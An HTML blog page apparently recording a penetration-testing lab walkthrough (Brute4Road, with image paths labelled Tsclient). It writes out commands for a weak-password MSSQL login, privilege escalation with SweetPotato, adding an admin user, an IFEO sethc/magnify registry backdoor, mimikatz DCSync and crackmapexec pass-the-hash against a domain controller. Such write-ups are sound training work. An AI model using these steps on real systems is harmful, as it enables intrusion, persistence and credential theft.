@@ -1,0 +1,397 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>靶场日记-Brute4Road | 『1nv_qaq&#39;s Blog』</title>
+    <meta name="author" content="1nv-qaq" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>wait wait wait...</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>『1NV_QAQ&#39;S BLOG』</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;『1NV_QAQ&#39;S BLOG』</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>靶场日记-Brute4Road</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/16
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透测试
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ff7d73">
+                    渗透测试
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <ul>
+<li>盘符共享</li>
+<li>镜像劫持</li>
+<li>域渗透：hash传递🎯<span id="more"></span></li>
+</ul>
+<p><code>39.99.137.104</code></p>
+<p>fscan扫一下</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/01.png" alt="img"></p>
+<p>mssql存在<code>sa:1qaz!QAZ</code>弱密码，MDUT连接，激活<code>XP_Cmdshell</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/02.png" alt="img"></p>
+<p><code>C:/迅雷下载/SweetPotato.exe -a whoami</code>提权成功</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/03.png" alt="img"></p>
+<pre><code class="Plain">C:/迅雷下载/SweetPotato.exe -a &quot;net user qaq1nv AbcD9635! /add&quot;
+C:/迅雷下载/SweetPotato.exe -a &quot;net localgroup administrators qaq1nv /add&quot;
+</code></pre>
+<p>添加用户<code>qaq1nv:AbcD9635!</code>成功远程登录，找到flag01</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/04.png" alt="img"></p>
+<p><code>flag&#123;30084de3-424b-4a37-b4e4-9bcf77e696dd&#125;</code></p>
+<p><code>ipconfig</code>看一下网络情况<code>172.22.8.18</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/05.png" alt="img"></p>
+<p>传<code>fscan.exe</code>扫内网</p>
+<pre><code class="markdown">C:\Users\qaq1nv\Desktop&gt;fscan.exe -h 172.22.8.18/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+trying RunIcmp2
+The current user permissions unable to send icmp packets
+start ping
+(icmp) Target 172.22.8.31     is alive
+(icmp) Target 172.22.8.18     is alive
+(icmp) Target 172.22.8.46     is alive
+(icmp) Target 172.22.8.15     is alive
+[*] Icmp alive hosts len is: 4
+172.22.8.31:139 open
+172.22.8.15:135 open
+172.22.8.31:135 open
+172.22.8.46:135 open
+172.22.8.18:139 open
+172.22.8.18:135 open
+172.22.8.46:80 open
+172.22.8.18:1433 open
+172.22.8.15:445 open
+172.22.8.46:445 open
+172.22.8.31:445 open
+172.22.8.18:445 open
+172.22.8.15:139 open
+172.22.8.46:139 open
+172.22.8.18:80 open
+172.22.8.15:88 open
+[*] alive ports len is: 16
+start vulscan
+[*] NetInfo
+[*]172.22.8.18
+   [-&gt;]WIN-WEB
+   [-&gt;]172.22.8.18
+   [-&gt;]2001:0:348b:fb58:2863:628:d89c:7697
+[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server
+[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT
+[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01
+[*] NetInfo
+[*]172.22.8.31
+   [-&gt;]WIN19-CLIENT
+   [-&gt;]172.22.8.31
+[*] NetInfo
+[*]172.22.8.46
+   [-&gt;]WIN2016
+   [-&gt;]172.22.8.46
+[*] NetInfo
+[*]172.22.8.15
+   [-&gt;]DC01
+   [-&gt;]172.22.8.15
+[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
+[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server
+[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ
+已完成 16/16
+[*] 扫描结束,耗时: 9.8108366s
+</code></pre>
+<p>分析一下</p>
+<pre><code class="Plain">172.22.8.15    DC域控
+172.22.8.18    拿下
+172.22.8.46    域内机器
+172.22.8.31    域内机器
+</code></pre>
+<p>flag01提示去看<code>user sessions</code>，net user看一下</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/06.png" alt="img"></p>
+<p>还有一个John用户，<code>netstat -no</code>发现<code>3389</code>端口和<code>.31</code>的机器有连接</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/07.png" alt="img"></p>
+<p><code>SharpToken</code>使用模拟令牌看一下John用户<code>SharpToken.exe execute &quot;WIN-WEB\John&quot; cmd true</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/08.png" alt="img"></p>
+<p>上次用Rubeus也报这个错，解决方案：服务器管理器-&gt;仪表盘-&gt;添加角色和功能-&gt;功能-&gt;勾选.net3.5-&gt;安装</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/09.png" alt="img"></p>
+<p>管理员权限成功执行<code>C:\Windows\system32&gt;&quot;C:\Users\qaq1nv\Desktop\SharpToken.exe&quot; execute &quot;WIN-WEB\John&quot; cmd true</code>，随后<code>net use</code>发现一个共享</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/10.png" alt="img"></p>
+<p>算是点题了</p>
+<pre><code class="Plain">dir \\TSCLIENT\C
+type \\TSCLIENT\C\credential.txt
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/11.png" alt="img"></p>
+<p>得到一组账号密码<code>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</code>并提示要镜像劫持，传frpc搭代理</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/12.png" alt="img"></p>
+<p><code>proxychains4 rdesktop 172.22.8.31:3389</code>远程连接桌面，注意如果密码已过期windows下直接连不上，在kali修改密码成功登录，登进去的是<code>.46</code>的机器</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/13.png" alt="img"></p>
+<p>查看权限，普通用户，无管理员权限</p>
+<pre><code class="Plain">net group &quot;domain admins&quot; /domain
+
+net config workstation
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/14.png" alt="img"></p>
+<p>结合之前的提示进行镜像劫持，查看注册表权限<code>get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/15.png" alt="img"></p>
+<p>发现普通用户可以对注册表进行创建和写入，于是我们设置shift后门</p>
+<p><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</code></p>
+<p>也可以用放大镜提权</p>
+<p><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</code></p>
+<p>成功提权，读flag02<code>type &quot;C:\Users\Administrator\flag\flag02.txt&quot;</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/16.png" alt="img"></p>
+<p>下面想办法给<code>.46</code>这台机器传mimikatz，可以利用上面发现的tsclient共享文件夹，在<code>.18</code>的机器上远程桌面连接<code>.46</code>的机器，设置好共享磁盘</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/17.png" alt="img"></p>
+<p>登录<code>.46</code>可以看到<code>.18</code>的C盘内容，从而上传mimikatz</p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/18.png" alt="img"></p>
+<p>上线mimikatz，<code>win+L</code>锁屏失败换了个命令<code>rundll32.exe user32.dll,LockWorkStation</code></p>
+<pre><code class="Plain">log
+privilege::debug
+lsadump::dcsync /domain /all /csv
+</code></pre>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/19.png" alt="img"></p>
+<p>最后hash传递打域控机器</p>
+<p><code>proxychains4 crackmapexec smb 172.22.8.15 -u administrator -H2c9d81bdcf3ec8b1def10328a7cc2f08 -d xiaorang.lab -x &quot;type c:\users\administrator\flag\flag03.txt&quot;</code></p>
+<p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-Tsclient/20.png" alt="img"></p>
+<p><code>flag&#123;22bfe1b4-522a-4927-8eed-72d50a88eb07&#125;</code></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2025 『1nv_qaq&#39;s Blog』
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;1nv-qaq
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script src="/js/<fireworks.min.js>"></script>
+
+
+    <canvas
+    id="fireworks"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"
+></canvas>
+<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<script src="/js/fireworks.min.js"></script>
+
+
+
+
+    
+    
+
+
+
+
+    
+</body>
+</html>
